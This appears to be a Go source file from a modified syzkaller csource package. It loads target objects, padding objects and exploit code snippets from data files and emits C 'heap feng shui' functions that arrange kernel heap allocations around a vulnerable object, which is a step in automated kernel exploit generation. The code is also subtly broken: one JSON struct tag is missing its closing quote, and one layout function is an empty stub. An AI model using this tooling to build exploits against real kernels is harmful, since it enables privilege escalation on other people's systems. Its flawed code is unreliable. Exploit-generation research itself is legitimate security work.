package csource

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
)

type TargetObject struct {
	Target  string   `json:"target"`
	Version string   `json:"version"`
	Name    string   `json:"name"`
	Size    int      `json:"size"`
	Alloc   string   `json:"allocator"`
	Define  string   `json:"define"`
	Deref   string   `json:"deref"`
	Num     int      `json:"num"`
	PreObj  int      `json:"pre_object"`
	PostObj int      `json:"post_object`
	Deps    []string `json:"dependency,omitempty"`
}

type PaddingObject struct {
	Alloc  string `json:"allocator"`
	Size   int    `json:"size"`
	Varlen bool   `json:"varlen"`
	Define string `json:"define"`
	Name   string `json:"name"`
	Prio   int    `json:"priority"`
}

type HeapExploit struct {
	Solution   map[string]interface{} `json:"solution"`
	Size       int                    `json:"size"`
	VulAlloc   string                 `json:"allocVuln"`
	Target     string                 `json:"target"`
	Version    string                 `json:"version"`
	Pointer    string                 `json:"pointer,omitempty"`
	AllocIndex int                    `json:"allocIndex"`
	DefIndex   int                    `json:"defIndex"`
	Layout     []int                  `json:"layout"`
	Syscalls   []uint64               `json:"syscalls"`
}

var Paddings = []PaddingObject{}
var Targets = map[string]TargetObject{}
var Exploits = map[string]string{}

func loadData(version, typ, suffix string, f func(string, []byte)) {
	path := filepath.Join(os.Getenv("GOPATH"), "src", "github.com", "google", "syzkaller", "pkg", "csource", "data", version)
	if _, err := os.Stat(path); os.IsNotExist(err) {
		panic("bad version provided")
	}
	targetPath := filepath.Join(path, typ)
	if _, err := os.Stat(targetPath); os.IsNotExist(err) {
		panic("No target dir")
	}
	_ = filepath.Walk(targetPath, func(path string, info os.FileInfo, err error) error {
		if filepath.Ext(path) == suffix {
			if data, err := ioutil.ReadFile(path); err == nil {
				f(filepath.Base(path), data)
			}
		}
		return nil
	})
}

func initialize(version string) {
	loadData(version, "targets", ".json", func(name string, data []byte) {
		var tgtObj TargetObject
		json.Unmarshal(data, &tgtObj)
		Targets[tgtObj.Target] = tgtObj
	})
	loadData(version, "padding", ".json", func(name string, data []byte) {
		var paddingObj PaddingObject
		json.Unmarshal(data, &paddingObj)
		Paddings = append(Paddings, paddingObj)
	})
	loadData(version, "deps", ".code", func(name string, data []byte) {
		k := name[:len(name)-5]
		Exploits[k] = string(data)
	})
}

func getFengshui_sameCache_oneTgt(out *bytes.Buffer, oneCall bool, vuln_bef, vuln_aft int, target TargetObject) string {
	if vuln_aft == 0 && target.PreObj == 0 {
		fmt.Fprintf(out, "void do_fengshui_tgt() {}\n")
		fmt.Fprintf(out, "void do_fengshui_vuln() {}\n")
		fmt.Fprintf(out, "void do_fengshui_trigger() {}\n")
		return ""
	}

	fmt.Fprintf(out, getDependency("msg_fengshui", ""), target.Size)
	total := vuln_bef + target.PreObj + 2
	fengshui := fmt.Sprintf("padding(0, %d);\n", total)
	if oneCall {
		fmt.Fprintf(out, "void do_fengshui_tgt() {\n")
		fmt.Fprintf(out, "release(%d);\n", total-1)
		for i := 0; i < target.PreObj; i++ {
			fmt.Fprintf(out, "release(%d);\n", i)
		}
		fmt.Fprintf(out, "}\n")

		fmt.Fprintf(out, "void do_fengshui_vuln() {\n")
		fmt.Fprintf(out, "release(%d);\n", total-2)
		for i := 0; i < vuln_bef; i++ {
			fmt.Fprintf(out, "release(%d);\n", target.PreObj+i)
		}
		fmt.Fprintf(out, "}\n")
	} else {
		fmt.Fprintf(out, "void do_fengshui_vuln() {\n")
		fmt.Fprintf(out, "release(%d);\n", total-2)
		for i := 0; i < vuln_bef; i++ {
			fmt.Fprintf(out, "release(%d);\n", i)
		}
		fmt.Fprintf(out, "}\n")

		fmt.Fprintf(out, "void do_fengshui_tgt() {\n")
		fmt.Fprintf(out, "release(%d);\n", total-1)
		for i := 0; i < target.PreObj; i++ {
			fmt.Fprintf(out, "release(%d);\n", vuln_bef+i)
		}
		fmt.Fprintf(out, "}\n")
	}
	// empty func
	fmt.Fprintf(out, "void do_fengshui_trigger() {\n")
	fmt.Fprintf(out, "}\n")

	return fengshui
}

func getFengshui_sameCache_metadata(out *bytes.Buffer, oneCall bool, vuln_bef, vuln_aft int, target TargetObject) string {

	fmt.Fprintf(out, getDependency("msg_fengshui", ""), target.Size)
	total := vuln_bef + 2
	if target.PreObj > 1 {
		total += target.PreObj - 1
	}

	var fengshui string
	if oneCall {
		total += vuln_aft
		fengshui = fmt.Sprintf("padding(0, %d);\n", total)
		fmt.Fprintf(out, "void do_fengshui_tgt() {\n")
		fmt.Fprintf(out, "release(%d);\n", total-1)
		fmt.Fprintf(out, "}\n")

		fmt.Fprintf(out, "void do_fengshui_vuln() {\n")
		for i := 0; i < vuln_aft; i++ {
			fmt.Fprintf(out, "release(%d);\n", i+vuln_bef)
		}
		fmt.Fprintf(out, "release(%d);\n", total-2)
		for i := 0; i < vuln_bef; i++ {
			fmt.Fprintf(out, "release(%d);\n", i)
		}
		fmt.Fprintf(out, "}\n")
	} else {
		fengshui = fmt.Sprintf("padding(0, %d);\n", total)
		fmt.Fprintf(out, "void do_fengshui_vuln() {\n")
		fmt.Fprintf(out, "release(%d);\n", total-2)
		for i := 0; i < vuln_bef; i++ {
			fmt.Fprintf(out, "release(%d);\n", i)
		}
		fmt.Fprintf(out, "}\n")

		fmt.Fprintf(out, "void do_fengshui_tgt() {\n")
		fmt.Fprintf(out, "release(%d);\n", total-1)
		fmt.Fprintf(out, "}\n")
	}

	fmt.Fprintf(out, "void do_fengshui_trigger() {\n")
	for i := 1; i < target.PreObj; i++ {
		fmt.Fprintf(out, "release(%d);\n", vuln_bef+i)
	}
	if target.PreObj == 0 {
		fmt.Fprintf(out, "padding(%d, %d);\n", total, total+1)
	}
	fmt.Fprintf(out, "}\n")

	return fengshui
}

func getFengshui_diffCache_oneTgt(out *bytes.Buffer, oneCall bool,
	vuln_bef, vuln_aft int, target TargetObject) string {
	fmt.Fprintf(out, "void do_fengshui_tgt() {}\n")
	fmt.Fprintf(out, "void do_fengshui_vuln() {}\n")
	fmt.Fprintf(out, "void do_fengshui_trigger() {}\n")
	return ""
}

func getTarget(version, name string) (ret TargetObject, err error) {
	var ok bool
	if ret, ok = Targets[name]; ok {
		return ret, nil
	}
	return ret, fmt.Errorf("Cannot find the target %s", name)
}

func getPadding(version, alloc string, size int) (PaddingObject, error) {
	var ret PaddingObject
	priority := -1
	for _, obj := range Paddings {
		if alloc == obj.Alloc || strings.HasPrefix(alloc, obj.Alloc) {
			if obj.Prio > priority {
				ret = obj
				priority = obj.Prio
			}
		}
	}
	if priority != -1 {
		return ret, nil
	}
	return ret, fmt.Errorf("No padding object available")
}

func getDependency(dep, pointer string) string {
	if code, ok := Exploits[dep]; ok {
		if pointer == "" {
			return code
		} else {
			return fmt.Sprintf(code, pointer)
		}
	}
	return ""
}

func getPaddingFunc(pad PaddingObject, size, num int) string {
	if pad.Varlen {
		return fmt.Sprintf(pad.Define, size, num)
	} else {
		return fmt.Sprintf(pad.Define, num)
	}
}
